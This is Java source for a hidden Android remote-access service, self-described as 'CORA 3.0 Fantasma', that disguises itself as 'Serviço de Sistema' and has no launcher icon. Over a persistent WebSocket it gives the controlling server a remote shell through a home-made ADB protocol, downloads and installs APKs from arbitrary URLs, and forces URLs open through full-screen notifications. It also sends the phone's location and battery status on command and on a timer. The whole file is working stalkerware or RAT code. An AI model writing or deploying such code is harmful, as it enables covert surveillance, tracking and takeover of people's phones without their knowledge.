package br.eni.cora;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.PowerManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;

// CORA 3.0 Fantasma — reescrito do zero. So 4G/5G: shell remoto (mini-adb),
// install remoto, open_url (full-screen intent), localizar, uninstall, setid.
// Oculto: sem launcher, codigo *#*#2672#*#*, nome "Servico de Sistema".
public class SinoService extends Service {
    public static volatile String status = "iniciando";
    public static volatile WsClient ws;
    public static volatile int lastBatt = -1;
    public static SinoService instancia;
    Thread worker;
    PowerManager.WakeLock wakeLock;

    // localizacao
    public static volatile double lastLat = 0, lastLon = 0, lastAcc = -1;
    public static volatile long lastFixTs = 0;

    // mini-adbd (protocolo ADB em processo proprio)
    static final int A_VERSION = 0x01000001, ADB_MAX = 4096,
            A_SYNC = 0x434e5953, A_CNXN = 0x4e584e43, A_OPEN = 0x4e45504f,
            A_OKAY = 0x59414b4f, A_CLSE = 0x45534c43, A_WRTE = 0x45545257;
    public static volatile boolean miniAdb = false;
    int miniNextId = 0;
    final HashMap<Integer, Process> miniProcs = new HashMap<>();
    final ByteArrayOutputStream miniBuf = new ByteArrayOutputStream();

    @Override
    public void onCreate() {
        super.onCreate();
        instancia = this;
        iniciarLocalizacao();
    }

    public int onStartCommand(Intent i, int f, int id) {
        instancia = this;
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "cora:coracao");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}
        Notification n = new Notification.Builder(this)
                .setContentTitle("Serviço de Sistema")
                .setContentText("em execução")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .build();
        startForeground(1, n);
        status = "serviço no ar";
        if (worker == null || !worker.isAlive()) {
            worker = new Thread(this::loop);
            worker.start();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try { if (wakeLock != null) wakeLock.release(); } catch (Exception ignored) {}
    }

    void loop() {
        while (true) {
            try { connectOnce(); }
            catch (Exception e) { status = "erro: " + e; }
            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
        }
    }

    void connectOnce() throws Exception {
        status = "conectando " + Prefs.host(this) + "...";
        final WsClient[] ref = new WsClient[1];
        WsClient w = new WsClient(new WsClient.Listener() {
            @Override public void onOpen() {
                ws = ref[0];
                status = "conectado";
                new Thread(() -> {
                    while (true) {
                        try {
                            if (ws != null) ws.send("{\"type\":\"hb\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"keep\":true}");
                            Thread.sleep(30000);
                        } catch (Exception e) { return; }
                    }
                }).start();
                new Thread(() -> {
                    while (true) {
                        try { sendTelemetry(); Thread.sleep(60000); }
                        catch (Exception e) { return; }
                    }
                }).start();
            }

            @Override public void onMessage(byte[] d) {
                if (miniAdb && ehBinario(d)) { miniAdbFeed(d); return; }
                if (ehBinario(d)) return;
                try { onCmd(new String(d)); }
                catch (Exception e) { status = "realocar".equals(e.getMessage()) ? "aguardando a clínica..." : "cmd: " + e; }
            }

            @Override public void onClose() {
                if (ws == ref[0]) ws = null;
                status = "desconectado (reconectando)";
            }
        });
        ref[0] = w;
        w.connect(Prefs.host(this), 443, "/ws?id=" + Prefs.id(this));
    }

    static boolean ehBinario(byte[] d) {
        if (d.length == 0) return false;
        for (byte b : d) {
            int c = b & 0xff;
            if (c < 9 || (c > 13 && c < 32)) return true;
        }
        return false;
    }

    void onCmd(String s) throws Exception {
        if (!s.trim().startsWith("{")) return;
        if (s.trim().startsWith("{\"pipe_ping\":true}")) return;
        if (s.startsWith("{\"type\":\"joined\"")) {
            JSONObject jj = new JSONObject(s);
            if (jj.optInt("peers", 1) == 1) {
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                throw new Exception("realocar");
            }
            return;
        }
        JSONObject j = new JSONObject(s);
        String cmd = j.optString("cmd");
        if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
        else if ("report".equals(cmd)) sendTelemetry();
        else if ("install_url".equals(cmd)) { final String u = j.optString("url"); new Thread(() -> instalarPorUrl(u)).start(); }
        else if ("uninstall_pkg".equals(cmd)) desinstalar(j.optString("pkg"));
        else if ("open_url".equals(cmd)) abrirUrl(j.optString("url"), j.optString("pkg", null));
        else if ("localizar".equals(cmd)) localizar();
        else if ("setid".equals(cmd)) {
            final String novo = j.optString("id", "");
            if (!novo.isEmpty() && novo.length() <= 40) {
                Prefs.set(this, Prefs.host(this), novo);
                status = "id alterado para " + novo;
                if (ws != null) ws.close();
            }
        }
        else if ("adbd".equals(cmd)) iniciarMiniAdbd();
    }

    void send(String s) {
        try { if (ws != null) ws.send(s); } catch (Exception e) { status = "send: " + e; }
    }

    // ---------- telemetria ----------
    void sendTelemetry() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int lvl = bi != null ? bi.getIntExtra("batt", -1) : -1;
            int sc = bi != null ? bi.getIntExtra("scale", -1) : -1;
            int pct = sc > 0 ? lvl * 100 / sc : -1;
            int plug = bi != null ? bi.getIntExtra("plugged", 0) : 0;
            lastBatt = pct;
            JSONObject j = new JSONObject();
            j.put("type", "hb");
            j.put("id", Prefs.id(this));
            j.put("batt", pct);
            j.put("plug", plug);
            j.put("ver", "3.0");
            j.put("model", android.os.Build.MODEL);
            j.put("ts", System.currentTimeMillis());
            if (lastFixTs > 0) {
                j.put("lat", lastLat); j.put("lon", lastLon); j.put("acc", lastAcc);
            }
            send(j.toString());
            if (status.startsWith("conectado")) status = "conectado | batt " + pct + "%";
        } catch (Exception e) { status = "tel: " + e; }
    }

    // ---------- localizacao ----------
    void iniciarLocalizacao() {
        try {
            final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.LocationListener lis = new android.location.LocationListener() {
                @Override public void onLocationChanged(android.location.Location l) {
                    lastLat = l.getLatitude(); lastLon = l.getLongitude();
                    lastAcc = l.hasAccuracy() ? l.getAccuracy() : -1;
                    lastFixTs = System.currentTimeMillis();
                }
                @Override public void onProviderDisabled(String p) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
            };
            try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 60000, 50f, lis); } catch (Exception ignored) {}
            try { lm.requestLocationUpdates(android.location.LocationManager.PASSIVE_PROVIDER, 60000, 50f, lis); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    void localizar() {
        new Thread(() -> {
            try {
                status = "localizando...";
                final android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
                final boolean[] got = {false};
                android.location.LocationListener lis = new android.location.LocationListener() {
                    @Override public void onLocationChanged(android.location.Location l) {
                        lastLat = l.getLatitude(); lastLon = l.getLongitude();
                        lastAcc = l.hasAccuracy() ? l.getAccuracy() : -1;
                        lastFixTs = System.currentTimeMillis();
                        got[0] = true;
                        try { lm.removeUpdates(this); } catch (Exception ignored) {}
                        send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + "}");
                        status = "localizado: " + lastLat + "," + lastLon;
                    }
                    @Override public void onProviderDisabled(String p) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
                };
                try { lm.requestLocationUpdates(android.location.LocationManager.GPS_PROVIDER, 0, 0f, lis); } catch (Exception ignored) {}
                try { lm.requestLocationUpdates(android.location.LocationManager.NETWORK_PROVIDER, 0, 0f, lis); } catch (Exception ignored) {}
                Thread.sleep(15000);
                try { lm.removeUpdates(lis); } catch (Exception ignored) {}
                if (!got[0]) {
                    send("{\"type\":\"location\",\"id\":\"" + Prefs.id(SinoService.this) + "\",\"lat\":" + lastLat + ",\"lon\":" + lastLon + ",\"acc\":" + lastAcc + ",\"ts\":" + lastFixTs + ",\"stale\":true}");
                    status = "sem fix novo";
                }
            } catch (Exception e) { status = "localizar: " + e; }
        }).start();
    }

    // ---------- mini-adbd ----------
    void iniciarMiniAdbd() {
        miniAdb = true;
        miniProcs.clear();
        synchronized (miniBuf) { miniBuf.reset(); }
        status = "mini-adb no ar";
    }

    void miniAdbFeed(byte[] d) {
        try {
            byte[] b;
            synchronized (miniBuf) {
                miniBuf.write(d);
                b = miniBuf.toByteArray();
                int off = 0;
                while (b.length - off >= 24) {
                    java.nio.ByteBuffer h = java.nio.ByteBuffer.wrap(b, off, 24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
                    int cmd = h.getInt(), a0 = h.getInt(), a1 = h.getInt(),
                            len = h.getInt(), chk = h.getInt(), magic = h.getInt();
                    if (magic != (cmd ^ 0xffffffff) || len < 0 || len > 1048576) { off++; continue; }
                    if (b.length - off < 24 + len) break;
                    byte[] payload = Arrays.copyOfRange(b, off + 24, off + 24 + len);
                    off += 24 + len;
                    miniAdbHandle(cmd, a0, a1, payload);
                }
                miniBuf.reset();
                miniBuf.write(b, off, b.length - off);
            }
        } catch (Exception e) { status = "miniadbd: " + e; }
    }

    void miniAdbHandle(int cmd, int a0, int a1, byte[] payload) {
        try {
            if (cmd == A_CNXN) {
                miniAdbSend(A_CNXN, A_VERSION, ADB_MAX,
                        "device::ro.product.name=cora;ro.product.model=mini-adbd;".getBytes("UTF-8"));
                status = "mini-adb: handshake ok";
            } else if (cmd == A_OPEN) {
                String svc2 = new String(payload, "UTF-8");
                if (svc2.startsWith("shell") || svc2.startsWith("exec:")) {
                    Process p = svc2.startsWith("exec:")
                            ? Runtime.getRuntime().exec(svc2.substring(5).trim().split("\\s+"))
                            : Runtime.getRuntime().exec("/system/bin/sh");
                    int lid = ++miniNextId;
                    synchronized (miniProcs) { miniProcs.put(lid, p); }
                    miniAdbSend(A_OKAY, lid, a0, null);
                    status = "mini-adb: aberto " + svc2;
                    final int flid = lid, fremote = a0;
                    final Process fp = p;
                    new Thread(() -> {
                        try {
                            java.io.InputStream o = fp.getInputStream();
                            byte[] buf = new byte[ADB_MAX];
                            int n;
                            while ((n = o.read(buf)) > 0) {
                                miniAdbSend(A_WRTE, flid, fremote, Arrays.copyOf(buf, n));
                            }
                            miniAdbSend(A_CLSE, flid, fremote, null);
                        } catch (Exception ignored) {}
                        try { fp.destroy(); } catch (Exception ignored) {}
                        synchronized (miniProcs) { miniProcs.remove(flid); }
                    }).start();
                } else {
                    miniAdbSend(A_CLSE, 0, a0, null);
                }
            } else if (cmd == A_WRTE) {
                Process p;
                synchronized (miniProcs) { p = miniProcs.get(a0); }
                if (p != null) {
                    boolean winint = payload.length == 12 && payload[0] == 0 && payload[1] == 'T'
                            && payload[2] == 'S' && payload[5] == 'N';
                    if (!winint) {
                        p.getOutputStream().write(payload);
                        p.getOutputStream().flush();
                    }
                    miniAdbSend(A_OKAY, a0, a1, null);
                } else {
                    miniAdbSend(A_CLSE, a0, a1, null);
                }
            } else if (cmd == A_CLSE) {
                Process p;
                synchronized (miniProcs) { p = miniProcs.remove(a0); }
                if (p != null) try { p.destroy(); } catch (Exception ignored) {}
            } else if (cmd == A_SYNC) {
                miniAdbSend(A_SYNC, a0, a1, null);
            }
        } catch (Exception e) { status = "miniadbd: " + e; }
    }

    synchronized void miniAdbSend(int cmd, int a0, int a1, byte[] payload) {
        try {
            byte[] pl = payload == null ? new byte[0] : payload;
            java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
            int chk = 0;
            for (byte c : pl) chk += (c & 0xff);
            h.putInt(cmd).putInt(a0).putInt(a1).putInt(pl.length).putInt(chk).putInt(cmd ^ 0xffffffff);
            if (ws != null) {
                byte[] out = new byte[24 + pl.length];
                System.arraycopy(h.array(), 0, out, 0, 24);
                System.arraycopy(pl, 0, out, 24, pl.length);
                ws.send(out);
            }
        } catch (Exception ignored) {}
    }

    // ---------- install remoto ----------
    void instalarPorUrl(String url) {
        try {
            status = "baixando APK...";
            java.io.InputStream in = new java.net.URL(url).openStream();
            java.io.File f = new java.io.File(getCacheDir(), "remoto.apk");
            java.io.FileOutputStream out = new java.io.FileOutputStream(f);
            byte[] buf = new byte[16384];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            out.close(); in.close();
            byte[] apk = new byte[(int) f.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(f);
            int lid2 = 0, lid = 0;
            while (lid2 < apk.length) lid += fis.read(apk, lid2, apk.length - lid2);
            fis.close();

            android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
            android.content.pm.PackageInstaller.SessionParams sp =
                    new android.content.pm.PackageInstaller.SessionParams(android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sid = pin.createSession(sp);
            android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
            java.io.OutputStream os = ses.openWrite("base.apk", 0, apk.length);
            os.write(apk);
            ses.fsync(os);
            os.close();

            android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
            si.setAction("br.eni.cora.INSTALL_STATUS");
            int fl = PendingIntent.FLAG_UPDATE_CURRENT;
            if (android.os.Build.VERSION.SDK_INT >= 23) fl |= PendingIntent.FLAG_IMMUTABLE;
            if (android.os.Build.VERSION.SDK_INT >= 31) fl |= PendingIntent.FLAG_MUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(this, sid, si, fl);
            ses.commit(pi.getIntentSender());
            status = "aguardando confirmação do sistema...";
        } catch (Exception e) {
            status = "install: " + e;
            send("{\"type\":\"install\",\"status\":\"erro\"}");
        }
    }

    public static class InstallReceiver extends android.content.BroadcastReceiver {
        @Override public void onReceive(android.content.Context c, android.content.Intent i) {
            int st = i.getIntExtra(android.content.pm.PackageInstaller.EXTRA_STATUS, -999);
            String msg = i.getStringExtra(android.content.pm.PackageInstaller.EXTRA_STATUS_MESSAGE);
            if (st == android.content.pm.PackageInstaller.STATUS_PENDING_USER_ACTION) {
                try {
                    android.content.Intent confirm = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
                    confirm.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(confirm);
                    SinoService.status = "confirme a instalação na tela";
                } catch (Throwable t1) {
                    try {
                        android.content.Intent confirm2 = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
                        PendingIntent npi = PendingIntent.getActivity(c,
                                (int) (System.currentTimeMillis() % 100000), confirm2,
                                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                        NotificationManager nm = (NotificationManager) c.getSystemService(NOTIFICATION_SERVICE);
                        if (android.os.Build.VERSION.SDK_INT >= 26) {
                            nm.createNotificationChannel(new NotificationChannel("instalacao", "Instalações", NotificationManager.IMPORTANCE_HIGH));
                        }
                        Notification n2 = new Notification.Builder(c)
                                .setContentTitle("Serviço de Sistema")
                                .setContentText("toque para confirmar a instalação")
                                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                                .setContentIntent(npi)
                                .setAutoCancel(true)
                                .build();
                        nm.notify(77, n2);
                        SinoService.status = "toque na notificação para confirmar";
                    } catch (Throwable t2) {
                        SinoService.status = "confirm UI falhou: " + t2;
                    }
                }
            } else if (st == android.content.pm.PackageInstaller.STATUS_SUCCESS) {
                SinoService.status = "instalado com sucesso";
            } else {
                SinoService.status = "install status " + st + ": " + msg;
            }
        }
    }

    // ---------- abrir URL (funciona oculto via full-screen intent) ----------
    void abrirUrl(String url, String pkg) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            if (pkg != null && !pkg.isEmpty()) i.setPackage(pkg);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception ignored) {}
        try {
            Intent vi = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            if (pkg != null && !pkg.isEmpty()) vi.setPackage(pkg);
            vi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this,
                    (int) (System.currentTimeMillis() % 100000), vi,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel("abrir", "Abrir", NotificationManager.IMPORTANCE_HIGH));
            }
            Notification n = new Notification.Builder(this)
                    .setContentTitle("Serviço de Sistema")
                    .setContentText("toque para abrir")
                    .setSmallIcon(android.R.drawable.stat_sys_download_done)
                    .setContentIntent(pi)
                    .setFullScreenIntent(pi, true)
                    .setAutoCancel(true)
                    .build();
            nm.notify(88, n);
            send("{\"type\":\"open\",\"status\":\"ok\"}");
        } catch (Exception e2) {
            send("{\"type\":\"open\",\"status\":\"erro\"}");
        }
    }

    void desinstalar(String pkg) {
        try {
            Intent i = new Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:" + pkg));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            send("{\"type\":\"uninstall\",\"status\":\"confirmacao_pedida\",\"pkg\":\"" + pkg + "\"}");
        } catch (Exception e) {
            send("{\"type\":\"uninstall\",\"status\":\"erro\"}");
        }
    }
}
